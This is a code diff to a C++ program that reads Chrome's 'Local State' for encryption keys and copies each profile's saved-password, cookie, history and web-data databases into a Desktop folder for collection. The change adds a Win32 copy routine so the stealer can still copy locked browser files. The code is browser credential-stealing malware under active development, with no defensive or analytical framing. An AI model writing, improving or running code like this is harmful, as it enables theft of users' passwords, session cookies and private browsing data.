@@ -16,6 +16,10 @@
 using json = nlohmann::json;
 namespace fs = std::filesystem;
 
+bool copy_file_win32(fs::path src, fs::path dest) {
+    return CopyFileW(src.wstring().c_str(), dest.wstring().c_str(), FALSE);
+}
+
 void log_to_file(const std::string& msg) {
     char* user_profile = nullptr;
     size_t len = 0;
@@ -261,9 +265,20 @@ void do_work() {
 
         log_to_file("Data path: " + data_path.string());
 
+        fs::path temp_dir = user_profile / "Desktop/chrome_db";
+        fs::create_directories(temp_dir);
+
         std::string local_state_str;
-    std::ifstream ls_file(data_path / "Local State");
-    if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+        fs::path ls_src = data_path / "Local State";
+        fs::path ls_tmp = temp_dir / "ls.tmp";
+        if (copy_file_win32(ls_src, ls_tmp)) {
+            std::ifstream ls_file(ls_tmp);
+            if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+            fs::remove(ls_tmp);
+        } else {
+            std::ifstream ls_file(ls_src);
+            if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+        }
 
     json ls_json = json::parse(local_state_str, nullptr, false);
     std::vector<unsigned char> v10_key, v20_key;
@@ -297,8 +312,6 @@ void do_work() {
     }
 
     json collected = json::array();
-    fs::path temp_dir = user_profile / "Desktop/chrome_db";
-    fs::create_directories(temp_dir);
 
     log_to_file("Starting profile iteration. Profiles found: " + std::to_string(profiles.size()));
 
@@ -312,7 +325,7 @@ void do_work() {
         fs::path db_path = p_path / "Login Data";
         fs::path tmp_db = temp_dir / "pass.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_win32(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -347,7 +360,7 @@ void do_work() {
         db_path = p_path / "Network/Cookies";
         tmp_db = temp_dir / "cook.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_win32(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -389,7 +402,7 @@ void do_work() {
         db_path = p_path / "History";
         tmp_db = temp_dir / "hist.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_win32(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
@@ -410,7 +423,7 @@ void do_work() {
         db_path = p_path / "Web Data";
         tmp_db = temp_dir / "web.tmp";
         if (fs::exists(db_path)) {
-            fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing);
+            copy_file_win32(db_path, tmp_db);
             sqlite3* db;
             if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                 sqlite3_stmt* stmt;
